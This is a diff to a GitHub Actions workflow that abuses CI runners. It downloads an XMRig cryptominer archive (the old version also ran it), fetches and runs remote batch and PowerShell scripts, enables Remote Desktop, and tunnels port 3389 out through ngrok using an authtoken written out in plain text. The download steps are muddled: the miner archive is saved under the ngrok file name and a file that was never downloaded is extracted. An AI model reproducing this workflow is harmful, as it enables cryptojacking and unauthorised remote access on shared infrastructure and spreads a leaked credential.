@@ -1,4 +1,5 @@
 name: Jaisai
+
 on: workflow_dispatch
 
 jobs:
@@ -10,12 +11,26 @@ jobs:
     steps:
     - name: Downloading Ngrok.
       run: |
+        Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/cpu/main/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
         Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/cpu/main/start.bat -OutFile start.bat
-        Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/cpu/main/xmrig2.zip -OutFile xmrig2.zip
-    - name: Extracting Xmrig2 Files.
-      run: Expand-Archive xmrig2.zip && cd xmrig2
-    - name: XMRIG
-      run: cmd /c D:\a\cpu\cpu\xmrig2\jai.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/cpu/main/xmrig2.zip -OutFile ngrok.zip
+    - name: Extracting Xmrig.
+      run: Expand-Archive xmrig.zip
+    - name: Extracting Ngrok Files.
+      run: Expand-Archive ngrok.zip
+    - name: Connecting to your Ngrok account.
+      run: .\ngrok\ngrok.exe authtoken 1x2066xQlyLdZUwp2bXA8B6Gzmy_7eM9SpbQxCF4HAsYJybDj
+    - name: Activating RDP access.
+      run: | 
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - name: Creating Tunnel.
+      run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp 3389"'
+    - name: Connecting to your RDP.
+      run: cmd /c start.bat
+    - name: Xmrig.
+      run: cmd dir
     - name: RDP is ready!
       run: | 
         Invoke-WebRequest https://raw.githubusercontent.com/romain09/AWS-RDP/main/loop.ps1 -OutFile loop.ps1
